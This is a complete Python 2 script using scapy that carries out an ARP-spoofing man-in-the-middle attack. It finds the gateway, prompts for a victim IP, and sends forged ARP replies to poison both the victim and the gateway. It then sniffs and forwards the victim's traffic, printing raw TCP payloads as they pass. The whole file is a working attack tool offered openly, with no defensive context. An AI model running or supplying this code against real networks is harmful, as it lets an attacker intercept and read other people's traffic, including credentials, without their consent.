#python 2.7.12
#sudo python arp.py
import socket
import fcntl
from scapy.all import *
import subprocess
import shlex
import thread
import time
def HwAddr(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
        myMac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
        return myMac 
def Ipaddr(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
        myIp = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])
	return myIp

# get gateway address
gateway= subprocess.check_output(shlex.split('ip r l'))
Target_IP_addr = gateway.split('default via')[-1].split()[0]

Attacker_Mac_addr = HwAddr('eth0')
Attacker_IP_addr = Ipaddr('eth0')
Victim_IP_addr = raw_input('input VictimIP : ')

print "--------------------------------------------"
print "Attacker MAC Address : "  + Attacker_Mac_addr
print "Attacker IP Address : " + Attacker_IP_addr
print "--------------------------------------------"
print "*****Attacker get Target_mac_addr for Targer_IP_addr*****"
Target_mac_addr=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=Target_IP_addr),timeout=2)

print "--------------------------------------------"
print "Target_mac_addr : "+ Target_mac_addr[0][0][1].src
print "Target_IP_Address : " + Target_IP_addr
print "--------------------------------------------"

print "*****Attacker get Victim_mac_addr for Victim_IP_addr*****"
Victim_mac_addr = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=Victim_IP_addr),timeout=2)
print "--------------------------------------------"
print "Victim_mac_addr : " +Victim_mac_addr[0][0][1].src
print "Victim IP Address : " + Victim_IP_addr
print "--------------------------------------------"

Target_mac_addr = Target_mac_addr[0][0][1].src
Victim_mac_addr= Victim_mac_addr[0][0][1].src

# Forge the ARP packet for the victim
arpFakeVic = ARP()
arpFakeVic.op=2
arpFakeVic.psrc=Target_IP_addr
arpFakeVic.pdst=Victim_IP_addr
arpFakeVic.hwdst=Victim_mac_addr

# Forge the ARP packet for the default GW
arpFakeDGW = ARP()
arpFakeDGW.op=2
arpFakeDGW.psrc=Victim_IP_addr
arpFakeDGW.pdst=Target_IP_addr
arpFakeDGW.hwdst=Target_mac_addr

send(arpFakeVic)
send(arpFakeDGW)

def arp_monitor_callback(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
		  pkt[Raw].show()
			#print pkt[TCP].paylaod
	if ARP in pkt:
                        send(arpFakeVic)
                        send(arpFakeDGW)
                        print "ARP Poison"
        else:
                if pkt[IP].src==Victim_IP_addr:
                        pkt[Ether].src = Attacker_Mac_addr
                        pkt[Ether].dst = Target_mac_addr
                        if pkt.haslayer(UDP) == 1:
                                del pkt[UDP].chksum
                                del pkt[UDP].len

                        del pkt.chksum
                        del pkt.len
                        try :
				sendp(pkt)
                        	print "SRC : Victim_MAC"
			except:
				print "!!!!!!!!!!!!!!!!!!!!"

                if pkt[IP].dst==Victim_IP_addr:
                        pkt[Ether].src = Attacker_Mac_addr
                        pkt[Ether].dst = Victim_mac_addr
                        if pkt.haslayer(UDP) == 1:
                                del pkt[UDP].chksum
                                del pkt[UDP].len

                        del pkt.len
                        del pkt.chksum
                        try:
				sendp(pkt)
                        	print "DST : Victim_MAC"
			except:
				print "?????????????????"
while True:
        sniff(prn=arp_monitor_callback, filter="host "+Target_IP_addr+" or host "+Victim_IP_addr, count=1)

